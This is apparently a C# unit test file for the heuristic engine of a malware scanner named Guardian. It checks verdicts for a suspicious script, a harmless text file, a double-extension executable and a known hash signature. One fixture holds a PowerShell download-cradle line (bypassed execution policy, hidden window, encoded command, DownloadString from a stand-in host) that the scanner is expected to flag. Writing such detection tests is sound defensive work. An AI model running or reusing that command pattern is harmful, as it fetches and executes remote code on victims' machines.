using Guardian.Contracts.AI.Models;
using Guardian.Contracts.Scanning;
using Guardian.Contracts.Signatures;
using Guardian.Scanner;
using Guardian.Scanner.Heuristics;
using Guardian.Signatures;

namespace Guardian.UnitTests.Scanner;

public class FileScannerHeuristicTests
{
    private const string AbcSha256 =
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";

    private static readonly byte[] MzHeader = [0x4D, 0x5A, 0x90, 0x00, 0x03];

    private const string SuspiciousScript =
        "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand AAAA; " +
        "(New-Object Net.WebClient).DownloadString('http://exemple.invalid/x')";

    private static FileScanner CreateScanner(bool withHeuristics, params SignatureMatch[] signatures) =>
        new(
            new InMemorySignatureProvider(signatures),
            withHeuristics ? new HeuristicAnalyzer() : null);

    private static string TempPath(string name) =>
        Path.Combine(Path.GetTempPath(), Guid.NewGuid() + "-" + name);

    [Fact]
    public async Task ScanAsync_SuspiciousScript_IsSuspiciousWithHeuristicScore()
    {
        string path = TempPath("run.ps1");
        await File.WriteAllTextAsync(path, SuspiciousScript);
        try
        {
            FileScanResult result = await CreateScanner(true).ScanAsync(
                new FileScanRequest { FilePath = path });

            Assert.Equal(ThreatVerdict.Suspicious, result.Verdict);
            Assert.True(result.HeuristicScore >= 0.8);
            Assert.NotEmpty(result.HeuristicFindings);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ScanAsync_HarmlessFile_IsCleanWithZeroHeuristicScore()
    {
        string path = TempPath("notes.txt");
        await File.WriteAllTextAsync(path, "bonjour");
        try
        {
            FileScanResult result = await CreateScanner(true).ScanAsync(
                new FileScanRequest { FilePath = path });

            Assert.Equal(ThreatVerdict.Clean, result.Verdict);
            Assert.Equal(0.0, result.HeuristicScore);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ScanAsync_LowHeuristicScore_StaysCleanButExposesScore()
    {
        string path = TempPath("facture.pdf.exe");
        await File.WriteAllBytesAsync(path, MzHeader);
        try
        {
            FileScanResult result = await CreateScanner(true).ScanAsync(
                new FileScanRequest { FilePath = path });

            Assert.Equal(ThreatVerdict.Clean, result.Verdict);
            Assert.True(result.HeuristicScore >= 0.45);
            Assert.Contains(result.HeuristicFindings, f => f.RuleId == HeuristicRuleIds.DoubleExtension);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ScanAsync_KnownSignature_StaysMaliciousWithHeuristics()
    {
        string path = TempPath("connu.txt");
        await File.WriteAllTextAsync(path, "abc");
        try
        {
            var signature = new SignatureMatch
            {
                SignatureId = "SIG-0001",
                Sha256 = AbcSha256,
                ThreatName = "Test.Malware.Sample",
                Severity = SignalSeverity.High
            };

            FileScanResult result = await CreateScanner(true, signature).ScanAsync(
                new FileScanRequest { FilePath = path });

            Assert.Equal(ThreatVerdict.Malicious, result.Verdict);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ScanAsync_WithoutHeuristicAnalyzer_BehavesAsBefore()
    {
        string path = TempPath("run.ps1");
        await File.WriteAllTextAsync(path, SuspiciousScript);
        try
        {
            FileScanResult result = await CreateScanner(false).ScanAsync(
                new FileScanRequest { FilePath = path });

            Assert.Equal(ThreatVerdict.Clean, result.Verdict);
            Assert.Equal(0.0, result.HeuristicScore);
            Assert.Empty(result.HeuristicFindings);
        }
        finally
        {
            File.Delete(path);
        }
    }
}
